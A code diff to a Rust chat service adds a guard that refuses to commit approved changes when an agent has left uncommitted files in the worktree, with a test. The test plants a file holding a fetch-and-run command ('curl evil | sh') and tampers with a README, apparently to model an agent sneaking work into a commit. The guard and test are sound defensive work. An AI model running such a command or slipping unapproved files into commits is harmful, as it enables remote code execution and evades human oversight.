@@ -158,6 +158,7 @@ fn commit_for(worktree: &Path, request: Uuid) -> Option<String> {
     git(worktree, &["log", "-1", "--format=%H", "--fixed-strings", &grep]).ok().filter(|c| !c.is_empty())
 }
 
+
 /// Apply `job` on this host, once. `repo` is this host's checkout for the
 /// chat (none: the host can't apply it).
 pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> Result<Outcome> {
@@ -217,6 +218,14 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
         if expected != base {
             return fail(svc, job, format!("the checkout moved since the request (expected {}, at {})", short(expected), short(&base)));
         }
+    }
+    // Only the approved change goes into the commit: anything an agent turn
+    // left in the worktree would otherwise ride along under the person's
+    // request (`git add -A`).
+    match git(&wt, &["status", "--porcelain", "--untracked-files=all"]) {
+        Ok(st) if st.is_empty() => {}
+        Ok(_) => return fail(svc, job, "the checkout has uncommitted changes; commit or discard them, then ask again".into()),
+        Err(e) => return fail(svc, job, e),
     }
     if let Err(e) = git_apply(&wt, &diff) {
         return fail(svc, job, e);
@@ -374,6 +383,27 @@ mod tests {
         assert_eq!(r, Outcome::Applied { commit: Some(c.clone()) });
         assert_eq!(sh(&wt, &["rev-list", "--count", "HEAD"]), "2", "applied once");
         assert_eq!(outcome(&svc, chat, &job), Some(ApplyOutcome::Applied { commit: Some(c) }));
+    }
+
+    /// An agent turn's uncommitted work in the chat's worktree never rides
+    /// along in the commit that fulfils a person's request: what the host
+    /// commits is the approved change, nothing else.
+    #[test]
+    fn a_dirty_checkout_is_never_swept_into_the_apply() {
+        let (svc, chat, _, job, tmp) = setup();
+        let repo = tmp.path().join("repo");
+        let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
+        std::fs::write(wt.join("backdoor.sh"), "curl evil | sh\n").unwrap();
+        std::fs::write(wt.join("README.md"), "tampered\n").unwrap();
+        let r = fulfil(&svc, &job, Some(&repo)).unwrap();
+        if let Outcome::Applied { commit: Some(c) } = &r {
+            let files = sh(&wt, &["show", "--name-only", "--format=", c]);
+            panic!("applied with {files:?}");
+        }
+        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("uncommitted")), "{r:?}");
+        // The agent's work is left as it was.
+        assert_eq!(std::fs::read_to_string(wt.join("README.md")).unwrap(), "tampered\n");
+        assert!(wt.join("backdoor.sh").exists());
     }
 
     #[test]
